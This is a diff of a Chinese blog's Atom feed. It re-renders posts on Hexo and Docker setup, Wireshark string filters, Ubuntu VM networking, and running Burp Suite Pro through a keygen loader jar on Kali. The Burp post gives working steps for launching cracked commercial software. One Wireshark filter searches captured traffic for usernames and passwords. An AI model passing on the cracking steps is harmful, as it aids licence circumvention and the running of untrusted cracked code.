+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">npm install hexo --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-renderer-pandoc --save</span><br><span class="line">npm install hexo-renderer-marked --save</span><br><span class="line"></span><br><span class="line"><span class="comment">#如有必要安装pandoc</span></span><br><span class="line">curl -O -sL https://github.com/jgm/pandoc/releases/download/2.8.1/pandoc-2.8.1-1-amd64.deb </span><br><span class="line">dpkg -i pandoc-2.8.1-1-amd64.deb</span><br><span class="line"><span class="comment">#如果上面命令不行，可以尝试</span></span><br><span class="line">curl -sL -O http://th.archive.ubuntu.com/ubuntu/pool/universe/p/pandoc/pandoc_1.19.2.4~dfsg-1build4_amd64.deb</span><br><span class="line">dpkg -i pandoc_1.19.2.4~dfsg-1build4_amd64.deb</span><br><span class="line">apt --fix-broken install</span><br><span class="line">npm install hexo-renderer-pandoc --save</span><br></pre></td></tr></table></figure>
+<h2 id="测试hexo"><a class="markdownIt-Anchor" href="#测试hexo"></a> 测试Hexo</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g </span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>
 <p>如果在Windows系统，无法访问<code>localhost:4000</code>，请参考 <a href></a></p>
-<h2 id="备份Images"><a href="#备份Images" class="headerlink" title="备份Images"></a>备份Images</h2><p>我们可以把container生成images来保存</p>
+<h2 id="备份images"><a class="markdownIt-Anchor" href="#备份images"></a> 备份Images</h2>
+<p>我们可以把container生成images来保存</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker commit -m=<span class="string">"has update"</span> -a=<span class="string">"author"</span> e218edb10161 blog_ver2</span><br><span class="line"></span><br><span class="line">各个参数说明：</span><br><span class="line">-m: 提交的描述信息</span><br><span class="line">-a: 指定镜像作者</span><br><span class="line">e218edb10161：容器 ID</span><br><span class="line">blog_ver2: 指定要创建的目标镜像名</span><br></pre></td></tr></table></figure>
-
-<h2 id="一些使用技巧"><a href="#一些使用技巧" class="headerlink" title="一些使用技巧"></a>一些使用技巧</h2><p>本地复制文件，可以通过这个命令来实现<code>docker cp</code></p>
-<h3 id="如何在容器与本地之间-copy-文件？"><a href="#如何在容器与本地之间-copy-文件？" class="headerlink" title="如何在容器与本地之间 copy 文件？"></a>如何在容器与本地之间 copy 文件？</h3><p>从容器到本地：</p>
+<h2 id="一些使用技巧"><a class="markdownIt-Anchor" href="#一些使用技巧"></a> 一些使用技巧</h2>
+<p>本地复制文件，可以通过这个命令来实现<code>docker cp</code></p>
+<h3 id="如何在容器与本地之间-copy-文件"><a class="markdownIt-Anchor" href="#如何在容器与本地之间-copy-文件"></a> 如何在容器与本地之间 copy 文件？</h3>
+<p>从容器到本地：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker cp &lt;containerId&gt;:/file/path/within/container /host/path/target</span><br></pre></td></tr></table></figure>
-
 <p>从本地到容器：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker cp filename &lt;containerId&gt;:/file/path/within/container</span><br></pre></td></tr></table></figure>
-
 <p>以上的操作如果是文件夹，就拷贝的是整个文件夹内容。</p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;h2 id=&quot;install-docker&quot;&gt;&lt;a href=&quot;#install-docker&quot; class=&quot;headerlink&quot; title=&quot;install docker&quot;&gt;&lt;/a&gt;install docker&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://flamep
+      &lt;h2 id=&quot;install-docker&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#install-docker&quot;&gt;&lt;/a&gt; install docker&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;http://flamepeak.com/2019/1
     
     </summary>
     
@@ -665,23 +698,28 @@
     <published>2019-12-05T01:32:25.000Z</published>
     <updated>2019-12-05T01:53:09.480Z</updated>
     
-    <content type="html"><![CDATA[<h3 id="字符串搜索"><a href="#字符串搜索" class="headerlink" title="字符串搜索"></a>字符串搜索</h3><ol>
-<li><p>搜索字符串用<code>ctrl + F</code>，配置选项，选择<code>Packet Bytes</code>和<code>String</code>，然后输入想要查询的内容即可；</p>
+    <content type="html"><![CDATA[<h3 id="字符串搜索"><a class="markdownIt-Anchor" href="#字符串搜索"></a> 字符串搜索</h3>
+<ol>
+<li>
+<p>搜索字符串用<code>ctrl + F</code>，配置选项，选择<code>Packet Bytes</code>和<code>String</code>，然后输入想要查询的内容即可；</p>
 </li>
-<li><p>可以在过滤框中直接输入<code>tcp and frame contains &quot;xxxxxxx&quot;</code>，来搜索内容</p>
+<li>
+<p>可以在过滤框中直接输入<code>tcp and frame contains &quot;xxxxxxx&quot;</code>，来搜索内容</p>
 </li>
-<li><p>可以使用<code>frame matches &quot;xxxxxx&quot;</code>，关键词matches使用与Perl语言兼容的正则表达式来搜索匹配。例如：</p>
+<li>
+<p>可以使用<code>frame matches &quot;xxxxxx&quot;</code>，关键词matches使用与Perl语言兼容的正则表达式来搜索匹配。例如：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frame matches &quot;(?i)bhi&quot;   #其中(?i)表示忽略大小写</span><br><span class="line">frame matches &quot;(?i)bh[is]&quot;    #匹配 BHS  BHI bHi bhi等</span><br><span class="line">frame matches &quot;(?i)(username|password)&quot;   #匹配username 或 password，忽略大小写</span><br><span class="line">frame matches &quot;\.(?i)(exe|zip|doc|xls|ppt|jar)&quot;  #\.表示转义，扩展名匹配</span><br><span class="line">frame matches &quot;\.com$&quot;   #匹配.com结尾   ^表示开头，$表示结尾</span><br></pre></td></tr></table></figure>
-
-<p>The ‘frame matches’ is a little different. This is a fairly flexible display filter and we will not cover all the options here. The keyword ‘matches’ is a “Regex next” to Wireshark - a Perl-compatible regular expression. </p>
 </li>
 </ol>
+<p>The ‘frame matches’ is a little different. This is a fairly flexible display filter and we will not cover all the options here. The keyword ‘matches’ is a “Regex next” to Wireshark - a Perl-compatible regular expression.</p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;h3 id=&quot;字符串搜索&quot;&gt;&lt;a href=&quot;#字符串搜索&quot; class=&quot;headerlink&quot; title=&quot;字符串搜索&quot;&gt;&lt;/a&gt;字符串搜索&lt;/h3&gt;&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;搜索字符串用&lt;code&gt;ctrl + F&lt;/code&gt;，配置选项，选择&lt;code&gt;Packet B
+      &lt;h3 id=&quot;字符串搜索&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#字符串搜索&quot;&gt;&lt;/a&gt; 字符串搜索&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;搜索字符串用&lt;code&gt;ctrl + F&lt;/code&gt;，配置选项，选择&lt;code&gt;Packet Bytes
     
     </summary>
     
@@ -702,41 +740,40 @@
     <content type="html"><![CDATA[<p>参考：<a href="https://www.cnblogs.com/dbxiaobai/p/10646298.html" target="_blank" rel="noopener">kali linux 2019.1 替换burpsuite pro 1.7.37</a></p>
 <p>文章中的办法总体可行，但是，具体实现有问题</p>
 <ol>
-<li><p>先切换JDK版本为1.8.执行</p>
+<li>
+<p>先切换JDK版本为1.8.执行</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">update-alternatives  --config  java</span><br></pre></td></tr></table></figure>
-
 <p>然后会显示多个jdk版本，1.8选2</p>
 </li>
-<li><p>输入<code>java –version</code>会显示jdk为1.8，把下载来的破解jar和原版burpsuite放到<code>/usr/bin</code>。</p>
+<li>
+<p>输入<code>java –version</code>会显示jdk为1.8，把下载来的破解jar和原版burpsuite放到<code>/usr/bin</code>。</p>
 </li>
-<li><p>执行破解burpsuite的流程，教程特别多。</p>
+<li>
+<p>执行破解burpsuite的流程，教程特别多。</p>
 </li>
-<li><p>bash进入<code>/usr/bin</code>目录，先删除以前的免费版burpsuite，</p>
+<li>
+<p>bash进入<code>/usr/bin</code>目录，先删除以前的免费版burpsuite，</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm –rf burpsuite</span><br></pre></td></tr></table></figure>
-
 <p>vi新建一个文件burpsuite，</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim burpsuite</span><br></pre></td></tr></table></figure>
-
 <p>内容为</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">#java -jar burp-loader-keygen-2_1_07.jar</span></span><br><span class="line">java -noverify -Xbootclasspath/p:/usr/bin/burp-loader-keygen-2_1_07.jar -jar /usr/bin/burpsuite_pro_v2.1.07.jar</span><br></pre></td></tr></table></figure>
-
 <p>此处，调试很长时间都不行，个人认为和burp的破解版本有关系，也就是<code>burp_loader.jar</code>或者<code>burp_helper.jar</code>，在一些版本中上面方法可行，但是有些版本又不行。  多尝试几个版本</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 将burp-loader-keygen-2_1_07.jar和burpsuite_pro_v2.1.07.jar放入/usr/bin目录</span><br><span class="line">2. bash界面，进入/usr/bin目录<span class="built_in">cd</span> /usr/bin；运行：java -jar /usr/bin/burp-loader-keygen-2_1_05.jar</span><br><span class="line">3. 正常情况下会进入破解的流程，如果无法启动主程序，那么需要更换其它help.jar 和loader.jar尝试；</span><br><span class="line">4. 破解成功之后，如果需要运行burp,直接在bash中输入burpsuite即可</span><br></pre></td></tr></table></figure>
-
-
-
 </li>
-</ol>
-<ol start="5">
-<li><p>保存退出，增加执行权限<code>chmod +x burpsuite</code></p>
+<li>
+<p>保存退出，增加执行权限<code>chmod +x burpsuite</code></p>
 </li>
-<li><p>进入<code>/usr/share/applications</code>，并编辑burpsuite的快捷方式</p>
+<li>
+<p>进入<code>/usr/share/applications</code>，并编辑burpsuite的快捷方式</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/applications</span><br><span class="line">vi kali-burpsuite.desktop</span><br></pre></td></tr></table></figure>
 </li>
-<li><p><code>Exec=sh -c &quot;java -jar /usr/bin/burpsuite&quot;</code>改为<code>Exec=sh -c &quot;/usr/bin/burpsuite&quot;</code></p>
+<li>
+<p><code>Exec=sh -c &quot;java -jar /usr/bin/burpsuite&quot;</code>改为<code>Exec=sh -c &quot;/usr/bin/burpsuite&quot;</code></p>
 <p>此处，本人修改为<code>Exec=sh -c &quot;cd /usr/bin; /usr/bin/burpsuite&quot;</code></p>
 </li>
-<li><p>然后就可以点桌面的快捷方式运行，开始快乐的使用吧！</p>
+<li>
+<p>然后就可以点桌面的快捷方式运行，开始快乐的使用吧！</p>
 </li>
 </ol>
 ]]></content>
@@ -773,10 +810,8 @@
 <p><img src="/sourcepictures/2019/11/26/3.png" alt="root"></p>
 <p>一般来说，这种模式下都是只读模式，无法修改文件，可以执行以下命令，开启写权限</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fsck -f -y /</span><br><span class="line">mount --options remount,rw /</span><br></pre></td></tr></table></figure>
-
 <p>查看所有网卡：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig -a</span><br></pre></td></tr></table></figure>
-
 <p><img src="/sourcepictures/2019/11/26/4.png" alt="root"></p>
 <p>我的是ens33，然后继续输入命令 <code>vi /etc/network/interfaces</code> 修改网络配置文件</p>
 <p>对于一些Linux版本，网络配置文件位于<code>/etc/netplan</code> 文件夹下，可以使用<code>ls /etc/netplan</code>查看文件夹内yaml文件名，然后使用<code>vi</code>修改此配置文件</p>
@@ -785,7 +820,9 @@
 <p>对于采用HostOnly模式的虚拟机，可以参考此文 <a href="https://blog.csdn.net/qq_28817739/article/details/77542860" target="_blank" rel="noopener">VMware-Host only（主机模式）网络连接方式</a>，在虚拟网卡vmware network adapter VMnet1中修改子网ip地址</p>
 <p>ubuntu12.04克隆后没有cannot find device eth0的问题</p>
 <p>于是查看一下所有的网络信息</p>
-<p><code>ifconfig -a</code><br>发现现实了eth2和eth3，并没有熟悉的eth0和eth1；<br>于是修改网络配置文件</p>
+<p><code>ifconfig -a</code><br>
+发现现实了eth2和eth3，并没有熟悉的eth0和eth1；<br>
+于是修改网络配置文件</p>
 <p><code>vi /etc/network/interfaces</code></p>
 <p>将<code>iface inet eth0 dhcp</code> 修改为<code>iface inet eth2 dhcp</code></p>
 <p>重启网卡</p>
@@ -794,7 +831,6 @@
 <p><code>vi /etc/udev/rules.d/70-persistent-net.rules</code></p>
 <p>可以看到咱们想要的东西 于是</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm /etc/udev/rules.d/70-persistent-net.rules</span><br><span class="line">/etc/init.d/networking restart</span><br></pre></td></tr></table></figure>
-
 <p>同样可以解决该问题。</p>
 ]]></content>
     
